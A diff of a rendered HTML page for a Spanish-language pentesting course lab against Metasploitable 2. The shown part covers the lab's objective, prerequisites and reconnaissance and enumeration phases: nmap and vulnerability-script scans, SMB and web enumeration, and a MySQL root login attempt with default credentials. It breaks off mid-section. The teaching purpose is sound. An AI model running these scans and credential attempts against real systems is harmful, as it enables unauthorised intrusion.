-  <li><a href="#entorno" id="toc-entorno" class="nav-link" data-scroll-target="#entorno"><span class="header-section-number">17.3</span> Entorno</a></li>
-  <li><a href="#fase-1-reconocimiento" id="toc-fase-1-reconocimiento" class="nav-link" data-scroll-target="#fase-1-reconocimiento"><span class="header-section-number">17.4</span> Fase 1: Reconocimiento</a>
+  <li><a href="#objetivo" id="toc-objetivo" class="nav-link active" data-scroll-target="#objetivo">Objetivo</a></li>
+  <li><a href="#prerrequisitos" id="toc-prerrequisitos" class="nav-link" data-scroll-target="#prerrequisitos">Prerrequisitos</a></li>
+  <li><a href="#entorno" id="toc-entorno" class="nav-link" data-scroll-target="#entorno">Entorno</a></li>
+  <li><a href="#fase-1-reconocimiento" id="toc-fase-1-reconocimiento" class="nav-link" data-scroll-target="#fase-1-reconocimiento">Fase 1: Reconocimiento</a>
   <ul class="collapse">
-  <li><a href="#descubrimiento-de-host" id="toc-descubrimiento-de-host" class="nav-link" data-scroll-target="#descubrimiento-de-host"><span class="header-section-number">17.4.1</span> 1.1 Descubrimiento de Host</a></li>
-  <li><a href="#escaneo-de-puertos-primera-pasada" id="toc-escaneo-de-puertos-primera-pasada" class="nav-link" data-scroll-target="#escaneo-de-puertos-primera-pasada"><span class="header-section-number">17.4.2</span> 1.2 Escaneo de Puertos — Primera Pasada</a></li>
-  <li><a href="#detección-de-so-y-versiones" id="toc-detección-de-so-y-versiones" class="nav-link" data-scroll-target="#detección-de-so-y-versiones"><span class="header-section-number">17.4.3</span> 1.3 Detección de SO y Versiones</a></li>
+  <li><a href="#descubrimiento-de-host" id="toc-descubrimiento-de-host" class="nav-link" data-scroll-target="#descubrimiento-de-host">1.1 Descubrimiento de Host</a></li>
+  <li><a href="#escaneo-de-puertos-primera-pasada" id="toc-escaneo-de-puertos-primera-pasada" class="nav-link" data-scroll-target="#escaneo-de-puertos-primera-pasada">1.2 Escaneo de Puertos — Primera Pasada</a></li>
+  <li><a href="#detección-de-so-y-versiones" id="toc-detección-de-so-y-versiones" class="nav-link" data-scroll-target="#detección-de-so-y-versiones">1.3 Detección de SO y Versiones</a></li>
   </ul></li>
-  <li><a href="#fase-2-escaneo-y-enumeración" id="toc-fase-2-escaneo-y-enumeración" class="nav-link" data-scroll-target="#fase-2-escaneo-y-enumeración"><span class="header-section-number">17.5</span> Fase 2: Escaneo y Enumeración</a>
+  <li><a href="#fase-2-escaneo-y-enumeración" id="toc-fase-2-escaneo-y-enumeración" class="nav-link" data-scroll-target="#fase-2-escaneo-y-enumeración">Fase 2: Escaneo y Enumeración</a>
   <ul class="collapse">
-  <li><a href="#scripts-de-vulnerabilidad-con-nmap" id="toc-scripts-de-vulnerabilidad-con-nmap" class="nav-link" data-scroll-target="#scripts-de-vulnerabilidad-con-nmap"><span class="header-section-number">17.5.1</span> 2.1 Scripts de Vulnerabilidad con Nmap</a></li>
-  <li><a href="#enumeración-smb" id="toc-enumeración-smb" class="nav-link" data-scroll-target="#enumeración-smb"><span class="header-section-number">17.5.2</span> 2.2 Enumeración SMB</a></li>
-  <li><a href="#enumeración-web-puerto-80" id="toc-enumeración-web-puerto-80" class="nav-link" data-scroll-target="#enumeración-web-puerto-80"><span class="header-section-number">17.5.3</span> 2.3 Enumeración Web — Puerto 80</a></li>
-  <li><a href="#enumeración-de-base-de-datos" id="toc-enumeración-de-base-de-datos" class="nav-link" data-scroll-target="#enumeración-de-base-de-datos"><span class="header-section-number">17.5.4</span> 2.4 Enumeración de Base de Datos</a></li>
-  <li><a href="#enumeración-de-irc-unrealircd" id="toc-enumeración-de-irc-unrealircd" class="nav-link" data-scroll-target="#enumeración-de-irc-unrealircd"><span class="header-section-number">17.5.5</span> 2.5 Enumeración de IRC (UnrealIRCd)</a></li>
+  <li><a href="#scripts-de-vulnerabilidad-con-nmap" id="toc-scripts-de-vulnerabilidad-con-nmap" class="nav-link" data-scroll-target="#scripts-de-vulnerabilidad-con-nmap">2.1 Scripts de Vulnerabilidad con Nmap</a></li>
+  <li><a href="#enumeración-smb" id="toc-enumeración-smb" class="nav-link" data-scroll-target="#enumeración-smb">2.2 Enumeración SMB</a></li>
+  <li><a href="#enumeración-web-puerto-80" id="toc-enumeración-web-puerto-80" class="nav-link" data-scroll-target="#enumeración-web-puerto-80">2.3 Enumeración Web — Puerto 80</a></li>
+  <li><a href="#enumeración-de-base-de-datos" id="toc-enumeración-de-base-de-datos" class="nav-link" data-scroll-target="#enumeración-de-base-de-datos">2.4 Enumeración de Base de Datos</a></li>
+  <li><a href="#enumeración-de-irc-unrealircd" id="toc-enumeración-de-irc-unrealircd" class="nav-link" data-scroll-target="#enumeración-de-irc-unrealircd">2.5 Enumeración de IRC (UnrealIRCd)</a></li>
   </ul></li>
-  <li><a href="#fase-3-explotación" id="toc-fase-3-explotación" class="nav-link" data-scroll-target="#fase-3-explotación"><span class="header-section-number">17.6</span> Fase 3: Explotación</a>
+  <li><a href="#fase-3-explotación" id="toc-fase-3-explotación" class="nav-link" data-scroll-target="#fase-3-explotación">Fase 3: Explotación</a>
   <ul class="collapse">
-  <li><a href="#vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523" id="toc-vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523" class="nav-link" data-scroll-target="#vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523"><span class="header-section-number">17.6.1</span> 3.1 Vector 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)</a></li>
-  <li><a href="#vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075" id="toc-vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075" class="nav-link" data-scroll-target="#vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075"><span class="header-section-number">17.6.2</span> 3.2 Vector 2 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)</a></li>
-  <li><a href="#vector-3-samba-3.0.20-username-map-script-cve-2007-2447" id="toc-vector-3-samba-3.0.20-username-map-script-cve-2007-2447" class="nav-link" data-scroll-target="#vector-3-samba-3.0.20-username-map-script-cve-2007-2447"><span class="header-section-number">17.6.3</span> 3.3 Vector 3 — Samba 3.0.20 “username map script” (CVE-2007-2447)</a></li>
-  <li><a href="#vector-4-bonus-dvwa-sql-injection-file-upload" id="toc-vector-4-bonus-dvwa-sql-injection-file-upload" class="nav-link" data-scroll-target="#vector-4-bonus-dvwa-sql-injection-file-upload"><span class="header-section-number">17.6.4</span> 3.4 Vector 4 (Bonus) — DVWA SQL Injection + File Upload</a></li>
+  <li><a href="#vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523" id="toc-vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523" class="nav-link" data-scroll-target="#vector-1-vsftpd-2.3.4-backdoor-cve-2011-2523">3.1 Vector 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)</a></li>
+  <li><a href="#vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075" id="toc-vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075" class="nav-link" data-scroll-target="#vector-2-unrealircd-3.2.8.1-backdoor-cve-2010-2075">3.2 Vector 2 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)</a></li>
+  <li><a href="#vector-3-samba-3.0.20-username-map-script-cve-2007-2447" id="toc-vector-3-samba-3.0.20-username-map-script-cve-2007-2447" class="nav-link" data-scroll-target="#vector-3-samba-3.0.20-username-map-script-cve-2007-2447">3.3 Vector 3 — Samba 3.0.20 “username map script” (CVE-2007-2447)</a></li>
+  <li><a href="#vector-4-bonus-dvwa-sql-injection-file-upload" id="toc-vector-4-bonus-dvwa-sql-injection-file-upload" class="nav-link" data-scroll-target="#vector-4-bonus-dvwa-sql-injection-file-upload">3.4 Vector 4 (Bonus) — DVWA SQL Injection + File Upload</a></li>
   </ul></li>
-  <li><a href="#fase-4-post-explotación" id="toc-fase-4-post-explotación" class="nav-link" data-scroll-target="#fase-4-post-explotación"><span class="header-section-number">17.7</span> Fase 4: Post-Explotación</a>
+  <li><a href="#fase-4-post-explotación" id="toc-fase-4-post-explotación" class="nav-link" data-scroll-target="#fase-4-post-explotación">Fase 4: Post-Explotación</a>
   <ul class="collapse">
-  <li><a href="#reconocimiento-del-sistema-comprometido" id="toc-reconocimiento-del-sistema-comprometido" class="nav-link" data-scroll-target="#reconocimiento-del-sistema-comprometido"><span class="header-section-number">17.7.1</span> 4.1 Reconocimiento del Sistema Comprometido</a></li>
-  <li><a href="#escalada-de-privilegios-desde-usuario-no-root" id="toc-escalada-de-privilegios-desde-usuario-no-root" class="nav-link" data-scroll-target="#escalada-de-privilegios-desde-usuario-no-root"><span class="header-section-number">17.7.2</span> 4.2 Escalada de Privilegios (desde usuario no-root)</a></li>
-  <li><a href="#actualizar-shell-a-meterpreter" id="toc-actualizar-shell-a-meterpreter" class="nav-link" data-scroll-target="#actualizar-shell-a-meterpreter"><span class="header-section-number">17.7.3</span> 4.3 Actualizar Shell a Meterpreter</a></li>
-  <li><a href="#persistencia" id="toc-persistencia" class="nav-link" data-scroll-target="#persistencia"><span class="header-section-number">17.7.4</span> 4.4 Persistencia</a></li>
-  <li><a href="#exfiltración-de-datos" id="toc-exfiltración-de-datos" class="nav-link" data-scroll-target="#exfiltración-de-datos"><span class="header-section-number">17.7.5</span> 4.5 Exfiltración de Datos</a></li>
-  <li><a href="#movimiento-lateral-y-pivoting-conceptual" id="toc-movimiento-lateral-y-pivoting-conceptual" class="nav-link" data-scroll-target="#movimiento-lateral-y-pivoting-conceptual"><span class="header-section-number">17.7.6</span> 4.6 Movimiento Lateral y Pivoting (Conceptual)</a></li>
-  <li><a href="#borrado-de-huellas" id="toc-borrado-de-huellas" class="nav-link" data-scroll-target="#borrado-de-huellas"><span class="header-section-number">17.7.7</span> 4.7 Borrado de Huellas</a></li>
+  <li><a href="#reconocimiento-del-sistema-comprometido" id="toc-reconocimiento-del-sistema-comprometido" class="nav-link" data-scroll-target="#reconocimiento-del-sistema-comprometido">4.1 Reconocimiento del Sistema Comprometido</a></li>
+  <li><a href="#escalada-de-privilegios-desde-usuario-no-root" id="toc-escalada-de-privilegios-desde-usuario-no-root" class="nav-link" data-scroll-target="#escalada-de-privilegios-desde-usuario-no-root">4.2 Escalada de Privilegios (desde usuario no-root)</a></li>
+  <li><a href="#actualizar-shell-a-meterpreter" id="toc-actualizar-shell-a-meterpreter" class="nav-link" data-scroll-target="#actualizar-shell-a-meterpreter">4.3 Actualizar Shell a Meterpreter</a></li>
+  <li><a href="#persistencia" id="toc-persistencia" class="nav-link" data-scroll-target="#persistencia">4.4 Persistencia</a></li>
+  <li><a href="#exfiltración-de-datos" id="toc-exfiltración-de-datos" class="nav-link" data-scroll-target="#exfiltración-de-datos">4.5 Exfiltración de Datos</a></li>
+  <li><a href="#movimiento-lateral-y-pivoting-conceptual" id="toc-movimiento-lateral-y-pivoting-conceptual" class="nav-link" data-scroll-target="#movimiento-lateral-y-pivoting-conceptual">4.6 Movimiento Lateral y Pivoting (Conceptual)</a></li>
+  <li><a href="#borrado-de-huellas" id="toc-borrado-de-huellas" class="nav-link" data-scroll-target="#borrado-de-huellas">4.7 Borrado de Huellas</a></li>
   </ul></li>
-  <li><a href="#fase-5-reporte-profesional" id="toc-fase-5-reporte-profesional" class="nav-link" data-scroll-target="#fase-5-reporte-profesional"><span class="header-section-number">17.8</span> Fase 5: Reporte Profesional</a>
+  <li><a href="#fase-5-reporte-profesional" id="toc-fase-5-reporte-profesional" class="nav-link" data-scroll-target="#fase-5-reporte-profesional">Fase 5: Reporte Profesional</a>
   <ul class="collapse">
-  <li><a href="#estructura-del-reporte" id="toc-estructura-del-reporte" class="nav-link" data-scroll-target="#estructura-del-reporte"><span class="header-section-number">17.8.1</span> 5.1 Estructura del Reporte</a></li>
+  <li><a href="#estructura-del-reporte" id="toc-estructura-del-reporte" class="nav-link" data-scroll-target="#estructura-del-reporte">5.1 Estructura del Reporte</a></li>
   </ul></li>
-  <li><a href="#resultado-esperado" id="toc-resultado-esperado" class="nav-link" data-scroll-target="#resultado-esperado"><span class="header-section-number">17.9</span> Resultado Esperado</a>
+  <li><a href="#resultado-esperado" id="toc-resultado-esperado" class="nav-link" data-scroll-target="#resultado-esperado">Resultado Esperado</a>
   <ul class="collapse">
-  <li><a href="#flags-para-capturar-evidencia" id="toc-flags-para-capturar-evidencia" class="nav-link" data-scroll-target="#flags-para-capturar-evidencia"><span class="header-section-number">17.9.1</span> Flags para Capturar (Evidencia)</a></li>
-  <li><a href="#capturas-de-pantalla-requeridas" id="toc-capturas-de-pantalla-requeridas" class="nav-link" data-scroll-target="#capturas-de-pantalla-requeridas"><span class="header-section-number">17.9.2</span> Capturas de Pantalla Requeridas</a></li>
+  <li><a href="#flags-para-capturar-evidencia" id="toc-flags-para-capturar-evidencia" class="nav-link" data-scroll-target="#flags-para-capturar-evidencia">Flags para Capturar (Evidencia)</a></li>
+  <li><a href="#capturas-de-pantalla-requeridas" id="toc-capturas-de-pantalla-requeridas" class="nav-link" data-scroll-target="#capturas-de-pantalla-requeridas">Capturas de Pantalla Requeridas</a></li>
   </ul></li>
-  <li><a href="#rúbrica-de-evaluación" id="toc-rúbrica-de-evaluación" class="nav-link" data-scroll-target="#rúbrica-de-evaluación"><span class="header-section-number">17.10</span> Rúbrica de Evaluación</a>
+  <li><a href="#rúbrica-de-evaluación" id="toc-rúbrica-de-evaluación" class="nav-link" data-scroll-target="#rúbrica-de-evaluación">Rúbrica de Evaluación</a>
   <ul class="collapse">
-  <li><a href="#desglose-del-laboratorio-40" id="toc-desglose-del-laboratorio-40" class="nav-link" data-scroll-target="#desglose-del-laboratorio-40"><span class="header-section-number">17.10.1</span> Desglose del Laboratorio (40%)</a></li>
-  <li><a href="#desglose-del-reporte-40" id="toc-desglose-del-reporte-40" class="nav-link" data-scroll-target="#desglose-del-reporte-40"><span class="header-section-number">17.10.2</span> Desglose del Reporte (40%)</a></li>
+  <li><a href="#desglose-del-laboratorio-40" id="toc-desglose-del-laboratorio-40" class="nav-link" data-scroll-target="#desglose-del-laboratorio-40">Desglose del Laboratorio (40%)</a></li>
+  <li><a href="#desglose-del-reporte-40" id="toc-desglose-del-reporte-40" class="nav-link" data-scroll-target="#desglose-del-reporte-40">Desglose del Reporte (40%)</a></li>
   </ul></li>
-  <li><a href="#estructura-de-entregables" id="toc-estructura-de-entregables" class="nav-link" data-scroll-target="#estructura-de-entregables"><span class="header-section-number">17.11</span> Estructura de Entregables</a></li>
-  <li><a href="#recursos" id="toc-recursos" class="nav-link" data-scroll-target="#recursos"><span class="header-section-number">17.12</span> Recursos</a>
+  <li><a href="#estructura-de-entregables" id="toc-estructura-de-entregables" class="nav-link" data-scroll-target="#estructura-de-entregables">Estructura de Entregables</a></li>
+  <li><a href="#recursos" id="toc-recursos" class="nav-link" data-scroll-target="#recursos">Recursos</a>
   <ul class="collapse">
-  <li><a href="#documentación-de-herramientas" id="toc-documentación-de-herramientas" class="nav-link" data-scroll-target="#documentación-de-herramientas"><span class="header-section-number">17.12.1</span> Documentación de Herramientas</a></li>
-  <li><a href="#cves-explotados-en-este-lab" id="toc-cves-explotados-en-este-lab" class="nav-link" data-scroll-target="#cves-explotados-en-este-lab"><span class="header-section-number">17.12.2</span> CVEs Explotados en este Lab</a></li>
-  <li><a href="#metasploitable-2" id="toc-metasploitable-2" class="nav-link" data-scroll-target="#metasploitable-2"><span class="header-section-number">17.12.3</span> Metasploitable 2</a></li>
-  <li><a href="#metodologías-de-pentest" id="toc-metodologías-de-pentest" class="nav-link" data-scroll-target="#metodologías-de-pentest"><span class="header-section-number">17.12.4</span> Metodologías de Pentest</a></li>
-  <li><a href="#recursos-de-aprendizaje-adicional" id="toc-recursos-de-aprendizaje-adicional" class="nav-link" data-scroll-target="#recursos-de-aprendizaje-adicional"><span class="header-section-number">17.12.5</span> Recursos de Aprendizaje Adicional</a></li>
+  <li><a href="#documentación-de-herramientas" id="toc-documentación-de-herramientas" class="nav-link" data-scroll-target="#documentación-de-herramientas">Documentación de Herramientas</a></li>
+  <li><a href="#cves-explotados-en-este-lab" id="toc-cves-explotados-en-este-lab" class="nav-link" data-scroll-target="#cves-explotados-en-este-lab">CVEs Explotados en este Lab</a></li>
+  <li><a href="#metasploitable-2" id="toc-metasploitable-2" class="nav-link" data-scroll-target="#metasploitable-2">Metasploitable 2</a></li>
+  <li><a href="#metodologías-de-pentest" id="toc-metodologías-de-pentest" class="nav-link" data-scroll-target="#metodologías-de-pentest">Metodologías de Pentest</a></li>
+  <li><a href="#recursos-de-aprendizaje-adicional" id="toc-recursos-de-aprendizaje-adicional" class="nav-link" data-scroll-target="#recursos-de-aprendizaje-adicional">Recursos de Aprendizaje Adicional</a></li>
   </ul></li>
   </ul>
 </nav>
@@ -436,9 +626,10 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <!-- main -->
 <main class="content" id="quarto-document-content">
 
-<header id="title-block-header" class="quarto-title-block default"><nav class="quarto-page-breadcrumbs quarto-title-breadcrumbs d-none d-lg-block" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../labs/lab-unidad1.html">Laboratorios</a></li><li class="breadcrumb-item"><a href="../labs/lab-unidad8.html"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></a></li></ol></nav>
+
+<header id="title-block-header" class="quarto-title-block default"><nav class="quarto-page-breadcrumbs quarto-title-breadcrumbs d-none d-lg-block" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../labs/lab-unidad1.html">Laboratorios</a></li><li class="breadcrumb-item"><a href="../labs/lab-unidad8.html"><span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></a></li></ol></nav>
 <div class="quarto-title">
-<div class="quarto-title-block"><div><h1 class="title"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></h1><button type="button" class="btn code-tools-button" id="quarto-code-tools-source"><i class="bi"></i> Code</button></div></div>
+<div class="quarto-title-block"><div><h1 class="title"><span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></h1><button type="button" class="btn code-tools-button" id="quarto-code-tools-source"><i class="bi"></i> Code</button></div></div>
 </div>
 
 
@@ -455,13 +646,13 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 </header>
 
 
-<section id="objetivo" class="level2" data-number="17.1">
-<h2 data-number="17.1" class="anchored" data-anchor-id="objetivo"><span class="header-section-number">17.1</span> Objetivo</h2>
+<section id="objetivo" class="level2">
+<h2 class="anchored" data-anchor-id="objetivo">Objetivo</h2>
 <p>Ejecutar un pentest profesional completo contra Metasploitable 2, aplicando todas las técnicas aprendidas durante el curso. El estudiante pasará por cada fase del ciclo de vida de un pentest real: reconocimiento, escaneo y enumeración, explotación de múltiples vectores, post-explotación, y entrega de un reporte profesional con hallazgos, evidencias y recomendaciones de remediación.</p>
 <p>Al finalizar, el estudiante habrá demostrado capacidad para: - Identificar servicios vulnerables en una red interna - Explotar al menos tres vectores de ataque diferentes - Escalar privilegios y mantener persistencia - Documentar hallazgos con CVEs, scores CVSS y pasos de reproducción - Redactar un reporte ejecutivo y técnico orientado al cliente</p>
 </section>
-<section id="prerrequisitos" class="level2" data-number="17.2">
-<h2 data-number="17.2" class="anchored" data-anchor-id="prerrequisitos"><span class="header-section-number">17.2</span> Prerrequisitos</h2>
+<section id="prerrequisitos" class="level2">
+<h2 class="anchored" data-anchor-id="prerrequisitos">Prerrequisitos</h2>
 <ul>
 <li>Haber completado Labs 1–7</li>
 <li>Kali Linux 2024.x (VirtualBox o VMware) — mínimo 4 GB RAM, 40 GB disco</li>
@@ -469,8 +660,8 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <li>Conocimiento básico de Metasploit Framework, nmap y enumeración de servicios</li>
 </ul>
 </section>
-<section id="entorno" class="level2" data-number="17.3">
-<h2 data-number="17.3" class="anchored" data-anchor-id="entorno"><span class="header-section-number">17.3</span> Entorno</h2>
+<section id="entorno" class="level2">
+<h2 class="anchored" data-anchor-id="entorno">Entorno</h2>
 <table class="caption-top table">
 <colgroup>
 <col style="width: 14%">
@@ -514,11 +705,11 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"Objetivo: </span><span class="va">$TARGET</span><span class="st">"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <hr>
 </section>
-<section id="fase-1-reconocimiento" class="level2" data-number="17.4">
-<h2 data-number="17.4" class="anchored" data-anchor-id="fase-1-reconocimiento"><span class="header-section-number">17.4</span> Fase 1: Reconocimiento</h2>
+<section id="fase-1-reconocimiento" class="level2">
+<h2 class="anchored" data-anchor-id="fase-1-reconocimiento">Fase 1: Reconocimiento</h2>
 <p><strong>Objetivo</strong>: Identificar el objetivo en la red, sistemas operativos y primera impresión de la superficie de ataque.</p>
-<section id="descubrimiento-de-host" class="level3" data-number="17.4.1">
-<h3 data-number="17.4.1" class="anchored" data-anchor-id="descubrimiento-de-host"><span class="header-section-number">17.4.1</span> 1.1 Descubrimiento de Host</h3>
+<section id="descubrimiento-de-host" class="level3">
+<h3 class="anchored" data-anchor-id="descubrimiento-de-host">1.1 Descubrimiento de Host</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Descubrir hosts activos en la subred</span></span>
 <span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">netdiscover</span> <span class="at">-r</span> 192.168.56.0/24 <span class="at">-i</span> eth0</span>
 <span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -531,8 +722,8 @@ Nmap scan report for 192.168.56.102
 Host is up (0.00041s latency).
 MAC Address: 08:00:27:XX:XX:XX (Oracle VirtualBox)</code></pre>
 </section>
-<section id="escaneo-de-puertos-primera-pasada" class="level3" data-number="17.4.2">
-<h3 data-number="17.4.2" class="anchored" data-anchor-id="escaneo-de-puertos-primera-pasada"><span class="header-section-number">17.4.2</span> 1.2 Escaneo de Puertos — Primera Pasada</h3>
+<section id="escaneo-de-puertos-primera-pasada" class="level3">
+<h3 class="anchored" data-anchor-id="escaneo-de-puertos-primera-pasada">1.2 Escaneo de Puertos — Primera Pasada</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Escaneo rápido TCP SYN para descubrir puertos abiertos</span></span>
 <span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sS</span> <span class="at">-T4</span> <span class="at">-p-</span> <span class="va">$TARGET</span> <span class="at">-oN</span> fase1_puertos.txt</span>
 <span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -566,8 +757,8 @@ MAC Address: 08:00:27:XX:XX:XX (Oracle VirtualBox)</code></pre>
 <p><strong>Nota</strong>: Metasploitable 2 expone intencionalmente docenas de servicios vulnerables. Esta superficie de ataque enorme es ideal para practicar múltiples vectores.</p>
 </blockquote>
 </section>
-<section id="detección-de-so-y-versiones" class="level3" data-number="17.4.3">
-<h3 data-number="17.4.3" class="anchored" data-anchor-id="detección-de-so-y-versiones"><span class="header-section-number">17.4.3</span> 1.3 Detección de SO y Versiones</h3>
+<section id="detección-de-so-y-versiones" class="level3">
+<h3 class="anchored" data-anchor-id="detección-de-so-y-versiones">1.3 Detección de SO y Versiones</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Detección completa: OS, versiones de servicios, scripts por defecto</span></span>
 <span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sS</span> <span class="at">-sV</span> <span class="at">-sC</span> <span class="at">-O</span> <span class="at">-p</span> 21,22,23,25,80,139,445,3306,5432,6667,8180 <span class="va">$TARGET</span> <span class="at">-oN</span> fase1_servicios.txt</span>
 <span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -588,11 +779,11 @@ OS details: Linux 2.6.9 - 2.6.33</code></pre>
 <hr>
 </section>
 </section>
-<section id="fase-2-escaneo-y-enumeración" class="level2" data-number="17.5">
-<h2 data-number="17.5" class="anchored" data-anchor-id="fase-2-escaneo-y-enumeración"><span class="header-section-number">17.5</span> Fase 2: Escaneo y Enumeración</h2>
+<section id="fase-2-escaneo-y-enumeración" class="level2">
+<h2 class="anchored" data-anchor-id="fase-2-escaneo-y-enumeración">Fase 2: Escaneo y Enumeración</h2>
 <p><strong>Objetivo</strong>: Profundizar en cada servicio para identificar vulnerabilidades específicas, usuarios, recursos compartidos y rutas web.</p>
-<section id="scripts-de-vulnerabilidad-con-nmap" class="level3" data-number="17.5.1">
-<h3 data-number="17.5.1" class="anchored" data-anchor-id="scripts-de-vulnerabilidad-con-nmap"><span class="header-section-number">17.5.1</span> 2.1 Scripts de Vulnerabilidad con Nmap</h3>
+<section id="scripts-de-vulnerabilidad-con-nmap" class="level3">
+<h3 class="anchored" data-anchor-id="scripts-de-vulnerabilidad-con-nmap">2.1 Scripts de Vulnerabilidad con Nmap</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Ejecutar scripts NSE de vulnerabilidad</span></span>
 <span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--script</span> vuln <span class="va">$TARGET</span> <span class="at">-p</span> 21,80,139,445,3306 <span class="at">-oN</span> fase2_vulns.txt</span>
 <span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -608,8 +799,8 @@ OS details: Linux 2.6.9 - 2.6.33</code></pre>
 |     State: VULNERABLE (Exploitable)
 |     CVE: CVE-2011-2523</code></pre>
 </section>
-<section id="enumeración-smb" class="level3" data-number="17.5.2">
-<h3 data-number="17.5.2" class="anchored" data-anchor-id="enumeración-smb"><span class="header-section-number">17.5.2</span> 2.2 Enumeración SMB</h3>
+<section id="enumeración-smb" class="level3">
+<h3 class="anchored" data-anchor-id="enumeración-smb">2.2 Enumeración SMB</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Enumeración completa de Samba</span></span>
 <span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">enum4linux</span> <span class="at">-a</span> <span class="va">$TARGET</span> <span class="kw">|</span> <span class="fu">tee</span> fase2_smb.txt</span>
 <span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -640,8 +831,8 @@ Share Enumeration:
         IPC$            IPC       IPC Service
         ADMIN$          IPC       IPC Service</code></pre>
 </section>
-<section id="enumeración-web-puerto-80" class="level3" data-number="17.5.3">
-<h3 data-number="17.5.3" class="anchored" data-anchor-id="enumeración-web-puerto-80"><span class="header-section-number">17.5.3</span> 2.3 Enumeración Web — Puerto 80</h3>
+<section id="enumeración-web-puerto-80" class="level3">
+<h3 class="anchored" data-anchor-id="enumeración-web-puerto-80">2.3 Enumeración Web — Puerto 80</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Escáner web completo con nikto</span></span>
 <span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nikto</span> <span class="at">-h</span> http://<span class="va">$TARGET</span> <span class="at">-o</span> fase2_nikto.txt</span>
 <span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a></span>
@@ -667,8 +858,8 @@ Share Enumeration:
 ==&gt; DIRECTORY: http://192.168.56.102/tikiwiki/
 + http://192.168.56.102/phpinfo.php (CODE:200|SIZE:48168)</code></pre>
 </section>
-<section id="enumeración-de-base-de-datos" class="level3" data-number="17.5.4">
-<h3 data-number="17.5.4" class="anchored" data-anchor-id="enumeración-de-base-de-datos"><span class="header-section-number">17.5.4</span> 2.4 Enumeración de Base de Datos</h3>
+<section id="enumeración-de-base-de-datos" class="level3">
+<h3 class="anchored" data-anchor-id="enumeración-de-base-de-datos">2.4 Enumeración de Base de Datos</h3>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co"># MySQL — probar credenciales por defecto</span></span>
 <span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span> <span class="at">-h</span> <span class="va">$TARGET</span> <span class="at">-u</span> root <span class="at">-p</span></span>
